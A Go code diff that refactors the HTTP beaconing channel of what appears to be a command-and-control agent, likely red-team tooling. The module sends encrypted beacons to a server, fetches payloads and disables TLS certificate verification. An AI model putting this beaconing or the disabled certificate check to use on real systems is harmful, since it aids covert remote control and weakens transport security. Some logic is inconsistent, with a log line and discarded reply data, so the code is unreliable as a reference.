@@ -15,80 +15,85 @@ import (
 
 var UA *string
 
-type HTTP struct {}
+type HTTP struct{}
 
 func init() {
 	util.CommunicationChannels["http"] = HTTP{}
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 }
 
-func (contact HTTP) Communicate(agent *util.AgentConfig, beacon util.Beacon) (util.Beacon, error) {
-	if _, err := checkValidHTTPTarget(agent.Address); err != nil {
-		return beacon, err
+func (contact HTTP) Communicate(agent *util.AgentConfig, name string) (*util.Connection, error) {
+	if _, err := checkValidHTTPTarget(agent.Contact["http"]); err != nil {
+		return nil, err
 	}
 
 	setHTTPProxyConfiguration(agent)
 
-	for {
-		refreshBeacon(agent, &beacon)
-		for agent.Contact == "http" {
-			body := beaconPOST(agent.Address, beacon)
-			var tempB util.Beacon
-			if err := json.Unmarshal(body, &tempB); err != nil || len(tempB.Links) == 0 {
-				break
-			}
-			runLinks(&tempB, &beacon, agent, "")
-		}
-		if agent.Contact != "http" {
-			return beacon, nil
-		}
-		beacon.Links = beacon.Links[:0]
-		jitterSleep(agent.Sleep, "HTTP")
-	}
-}
+	// Create the Envelope Send/Recv channels.
+	send := make(chan *util.Envelope)
+	recv := make(chan *util.Envelope)
+	ctrl := make(chan bool)
 
-func checkValidHTTPTarget(address string) (bool, error) {
-	u, err := url.Parse(address)
-	if err != nil || u.Scheme == "" || u.Host == "" {
-		util.DebugLogf("[%s] is an invalid URL for HTTP/S beacons", address)
-		return false, errors.New("INVALID URL")
-	}
-	return true, nil
-}
-
-func setHTTPProxyConfiguration(agent *util.AgentConfig) {
-	var proxyUrlFunc func (*http.Request) (*url.URL, error)
-
-	if proxyUrl, err := url.Parse(agent.Proxy); err == nil && proxyUrl.Scheme != "" && proxyUrl.Host != "" {
-		proxyUrlFunc = http.ProxyURL(proxyUrl)
-	} else {
-		proxyUrlFunc = http.ProxyFromEnvironment
+	// Create the Connection to be returned to the caller.
+	connection := &util.Connection{
+		Name:   name,
+		Type:   "http",
+		Send:   send,
+		Recv:   recv,
+		Ctrl:   ctrl,
+		IsOpen: true,
+		Cleanup: func() {
+			util.DebugLogf("[http] cleaning up connection.")
+			close(send)
+			ctrl <- true
+			close(recv)
+		},
 	}
 
-	http.DefaultTransport.(*http.Transport).Proxy = proxyUrlFunc
+	// Write socket goroutine reads from the connection Send chan and writes to the socket.
+	go func() {
+		defer connection.Cleanup()
+		for envelope := range send {
+			util.DebugLogf("[-] Sent TCP beacon.")
+			go beaconPOST(agent.Contact["http"], connection, *envelope.Beacon)
+		}
+	}()
+
+	//for {
+	//	refreshBeacon(agent, &beacon, "http")
+	//	for len(agent.Contact["http"]) > 0 {
+	//		body := beaconPOST(agent.Contact["http"], beacon)
+	//		var tempB util.Beacon
+	//		if err := json.Unmarshal(body, &tempB); err != nil || len(tempB.Links) == 0 {
+	//			break
+	//		}
+	//		runLinks(&tempB, &beacon, agent, "")
+	//	}
+	//	if len(agent.Contact["http"]) > 0 {
+	//		return beacon, nil
+	//	}
+	//	beacon.Links = beacon.Links[:0]
+	//	jitterSleep(agent.Sleep, "HTTP")
+	//}
+
+	return connection, nil
 }
 
-func requestHTTPPayload(address string) ([]byte, string, int, error) {
-	valid, err := checkValidHTTPTarget(address)
-	if valid {
-		body, _, code, netErr := request(address, "GET", []byte{})
-		if netErr != nil {
-			return nil, "", code, netErr
-		}
-		if code == 200 {
-			return body, path.Base(address), code, netErr
-		}
-	}
-	return nil, "", 0, err
-}
-
-func beaconPOST(address string, beacon util.Beacon) []byte {
+func beaconPOST(address string, connection *util.Connection, beacon util.Beacon) {
+	var b util.Beacon
 	data, _ := json.Marshal(beacon)
 	body, _, code, err := request(address, "POST", util.Encrypt(data))
 	if len(body) > 0 && code == 200 && err == nil {
-		return []byte(util.Decrypt(string(body)))
+		err := json.Unmarshal([]byte(util.Decrypt(string(body))), &b)
+		if err != nil {
+			util.DebugLog("[-] Unable to decrypt HTTP message.")
+		}
+
+		envelope := util.BuildEnvelope(&beacon, connection)
+		if envelope != nil {
+			connection.Recv <- envelope
+		}
 	}
-	return body
 }
 
 func request(address string, method string, data []byte) ([]byte, http.Header, int, error) {
@@ -118,3 +123,73 @@ func request(address string, method string, data []byte) ([]byte, http.Header, i
 	}
 	return body, resp.Header, resp.StatusCode, err
 }
+
+func checkValidHTTPTarget(address string) (bool, error) {
+	u, err := url.Parse(address)
+	if err != nil || u.Scheme == "" || u.Host == "" {
+		util.DebugLogf("[%s] is an invalid URL for HTTP/S beacons", address)
+		return false, errors.New("INVALID URL")
+	}
+	return true, nil
+}
+
+func setHTTPProxyConfiguration(agent *util.AgentConfig) {
+	var proxyUrlFunc func(*http.Request) (*url.URL, error)
+
+	if proxyUrl, err := url.Parse(agent.Proxy); err == nil && proxyUrl.Scheme != "" && proxyUrl.Host != "" {
+		proxyUrlFunc = http.ProxyURL(proxyUrl)
+	} else {
+		proxyUrlFunc = http.ProxyFromEnvironment
+	}
+
+	http.DefaultTransport.(*http.Transport).Proxy = proxyUrlFunc
+}
+
+func requestHTTPPayload(address string) ([]byte, string, int, error) {
+	valid, err := checkValidHTTPTarget(address)
+	if valid {
+		body, _, code, netErr := request(address, "GET", []byte{})
+		if netErr != nil {
+			return nil, "", code, netErr
+		}
+		if code == 200 {
+			return body, path.Base(address), code, netErr
+		}
+	}
+	return nil, "", 0, err
+}
+
+//func beaconPOST(address string, beacon util.Beacon) []byte {
+//	data, _ := json.Marshal(beacon)
+//	body, _, code, err := request(address, "POST", util.Encrypt(data))
+//	if len(body) > 0 && code == 200 && err == nil {
+//		return []byte(util.Decrypt(string(body)))
+//	}
+//	return body
+//}
+//
+//func request(address string, method string, data []byte) ([]byte, http.Header, int, error) {
+//	client := &http.Client{}
+//	req, err := http.NewRequest(method, address, bytes.NewBuffer(data))
+//	if err != nil {
+//		util.DebugLog(err)
+//	}
+//	req.Close = true
+//	req.Header.Set("User-Agent", *UA)
+//	resp, err := client.Do(req)
+//	if err != nil {
+//		util.DebugLog(err)
+//		return nil, nil, 404, err
+//	}
+//	body, err := ioutil.ReadAll(resp.Body)
+//	if err != nil {
+//		util.DebugLog(err)
+//		return nil, nil, resp.StatusCode, err
+//	}
+//	err = resp.Body.Close()
+//	if err != nil {
+//		util.DebugLog(err)
+//		return nil, nil, resp.StatusCode, err
+//	}
+//	return body, resp.Header, resp.StatusCode, err
+//}
